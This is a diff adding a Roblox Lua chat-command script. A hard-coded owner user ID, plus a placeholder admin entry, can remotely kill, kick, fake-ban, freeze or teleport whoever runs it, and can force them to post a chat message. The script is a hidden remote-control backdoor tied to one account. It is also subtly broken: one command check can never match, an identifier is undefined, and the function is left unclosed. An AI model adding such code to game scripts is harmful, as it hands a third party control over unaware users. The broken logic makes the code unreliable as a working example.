@@ -1,0 +1,54 @@
+local whitelist = { owner = { 3954000743,}, admin = { ID },}
+
+owner = false admin = false
+
+local function runcommand(message,author) owner = false admin = false local player = game.Players[author] for i ,_ in pairs(whitelist.admin) do if player.UserId == _ then admin = true end
+end for i ,_ in pairs(whitelist.owner) do if player.UserId == _ then owner = true end
+end
+
+if admin or owner then
+	if message:sub(1, 6) == "!bring" then
+		if message:match(game.Players.LocalPlayer.Name) then
+			local plr = game.Players.LocalPlayer
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[author].Character.Head.CFrame
+		end
+	end
+	-- kill start
+	if message:sub(1, 5) == "!kill" then
+		if message:match(game.Players.LocalPlayer.Name) then
+			local plr = game.Players.LocalPlayer
+			game.Players.LocalPlayer.Character.Humanoid.Health = 0
+		end
+	end
+	--  kill end
+	-- kick start
+	if message:sub(1, 5) == "!kick" then
+		if message:match(game.Players.LocalPlayer.Name) then
+			local plr = game.Players.LocalPlayer
+			game.Players.LocalPlayer:Kick("You got kicked by a admin/owner")
+
+		end
+	end
+	if message:sub(1, 5) == "!ban" then
+		if message:match(game.Players.LocalPlayer.Name) then
+			local plr = game.Players.LocalPlayer
+			game.Players.LocalPlayer:Kick("User: BANNED")
+
+		end
+	end
+	if message:sub(1, 7) == "!freeze" then
+		if message:match(game.Players.LocalPlayer.Name) then
+			game.Players.LocalPlayer.Character.Head.Anchored = true
+		end
+	end
+	
+	if message:sub(1, 9) == "!unfreeze" then
+		if message:match(game.Players.LocalPlayer.Name) then
+			game.Players.LocalPlayer.Character.Head.Anchored = false
+		end
+	end
+	if message:sub(1, 9) == "/e" then
+		if message:match(game.Players.LocalPlayer.Name) then
+			game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("XDLOL!", 'All');
+		end
+	end
